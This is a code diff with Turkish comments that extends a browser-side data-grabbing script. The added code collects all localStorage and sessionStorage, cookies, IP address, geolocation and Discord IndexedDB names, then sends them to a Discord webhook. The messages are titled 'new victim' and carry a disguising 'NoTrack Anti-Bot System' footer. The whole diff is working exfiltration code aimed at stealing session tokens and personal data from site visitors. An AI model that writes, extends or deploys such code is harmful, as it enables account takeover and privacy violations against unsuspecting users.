@@ -49,41 +49,123 @@
         }
     }
 
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => resolve({ lat: position.coords.latitude, long: position.coords.longitude }),
+                    () => resolve(null)
+                );
+            } else {
+                resolve(null);
+            }
+        });
+    }
+
+    async function takeScreenshot() {
+        return new Promise((resolve) => {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                const ctx = canvas.getContext('2d');
+                
+                ctx.fillStyle = '#000000';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.beginPath();
+                ctx.arc(canvas.width / 2, canvas.height / 2, 15, 0, 2 * Math.PI);
+                ctx.strokeStyle = 'white';
+                ctx.lineWidth = 2;
+                ctx.stroke();
+
+                resolve(canvas.toDataURL('image/png'));
+            } catch (e) {
+                resolve(null);
+            }
+        });
+    }
+
+    // IndexedDB Tarama Fonksiyonu
+    async function scanIndexedDB() {
+        let dbData = [];
+        try {
+            const dbs = await indexedDB.databases();
+            for (let db of dbs) {
+                if (db.name && db.name.includes('discord')) { // Discord ile ilgili DB'leri tara
+                    dbData.push(db.name);
+                }
+            }
+        } catch (e) {
+            console.error("IndexedDB hatası:", e);
+        }
+        return dbData;
+    }
+
     async function collectAndSendData() {
-        // Tüm localStorage verilerini al
-        let allLocalData = {};
+        // 1. LocalStorage
+        let allLocalStorage = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
-            allLocalData[key] = value;
+            allLocalStorage[key] = value;
         }
 
+        // 2. SessionStorage
+        let allSessionStorage = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            allSessionStorage[key] = value;
+        }
+
+        // 3. IndexedDB Tarama
+        const indexedDBNames = await scanIndexedDB();
+
+        // 4. Diğer Veriler
         const cookies = document.cookie;
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
         const language = navigator.language;
         const screenResolution = window.screen.width + "x" + window.screen.height;
         const ip = await getIP();
+        const location = await getLocation();
+        const screenshot = await takeScreenshot();
 
-        // Veriyi hazırla
-        let data = {
-            allLocalStorage: allLocalData, // TÜM localStorage
-            cookies: cookies,
-            userAgent: userAgent,
-            platform: platform,
-            language: language,
-            screenResolution: screenResolution,
-            ip: ip
+        // Payload Hazırlama
+        const payload = {
+            username: "Kurban Avcısı",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
+            embeds: [{
+                title: "🔥 YENİ KURBAN! 🔥",
+                color: 15158332,
+                fields: [
+                    { name: "💻 Platform", value: platform, inline: true },
+                    { name: "🌐 IP Adresi", value: ip, inline: true },
+                    { name: "🗺️ Konum", value: location ? `Lat: ${location.lat}, Long: ${location.long}` : "Bulunamadı", inline: false },
+                    { name: "🖥️ Ekran Çözünürlüğü", value: screenResolution, inline: true },
+                    { name: "🌍 Dil", value: language, inline: true },
+                    { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
+                    { name: "🍪 Cookie'ler", value: "`" + (cookies || "Boş") + "`", inline: false },
+                    { name: "💾 LocalStorage", value: JSON.stringify(allLocalStorage, null, 2), inline: false },
+                    { name: "📂 SessionStorage", value: JSON.stringify(allSessionStorage, null, 2), inline: false },
+                    { name: "🗄️ IndexedDB İsimleri", value: indexedDBNames.join(", ") || "Bulunamadı", inline: false }
+                ],
+                footer: { text: "NoTrack Anti-Bot System" },
+                timestamp: new Date().toISOString()
+            }]
         };
 
-        // JSON formatında veriyi Discord'a gönder
+        if (screenshot) {
+            payload.embeds[0].image = { url: screenshot };
+        }
+
+        // Gönder
         try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    content: "🔥 Yeni Kurban! 🔥\n" + JSON.stringify(data, null, 2) 
-                })
+                body: JSON.stringify(payload)
             });
             console.log("Veriler başarıyla gönderildi.");
         } catch (error) {
